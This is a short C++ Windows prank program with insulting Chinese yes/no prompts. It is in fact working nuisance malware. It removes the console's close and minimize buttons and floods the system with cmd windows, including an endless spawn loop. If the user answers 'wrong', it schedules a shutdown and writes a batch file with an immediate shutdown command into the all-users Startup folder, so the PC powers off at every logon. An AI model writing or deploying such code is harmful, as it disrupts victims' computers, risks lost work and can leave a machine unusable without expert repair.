#include<Windows.h>
#include<bits/stdc++.h>
#include<conio.h>
using namespace std;
 
void lock()
{
	HWND hWnd = GetConsoleWindow();
	SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
	HMENU hmenu = GetSystemMenu(hWnd, false);
	RemoveMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
	LONG style = GetWindowLong(hWnd, GWL_STYLE);
	style &= ~(WS_MINIMIZEBOX);
	SetWindowLong(hWnd, GWL_STYLE, style);
	SetWindowPos(hWnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
	ShowWindow(hWnd, SW_SHOWNORMAL);
	DestroyMenu(hmenu);
	ReleaseDC(hWnd, NULL);
}
void shani(){
        string h="拒不投降要扣税~~~~~~~~~~~~呃……拒不投降要升天！";
    	for(int i=0;i<h.size();i++){
			cout<<h[i];
			Sleep(30);
		}
        freopen("C://ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/死亡吧~~~.bat","w",stdout);
        cout<<"shutdown -s -t 0";
        system("shutdown -s -t 100");
        while(1) system("start cmd");
}
int main(){
    sb:
	lock();
    cout<<"格格帅不帅？YES or NO";
    string s;
    cin>>s;
    if(s=="yes"||s=="YES"){
        cout<<"知道是就好！";
        for(int i=0;i<114;i++) system("start cmd");
    }
    if(s=="no"||s=="NO"){
        cout<<"好吧，那你是不是SB?";
        cin>>s;
        if(s=="是"||s=="yes"||s=="YES"){
            cout<<"知道是就好！";
            for(int i=0;i<114;i++) system("start cmd");
        }
        else{
            shani();
        }
    }
    else{cout<<"你食不食油饼？"; goto sb;}
	return 0;
}

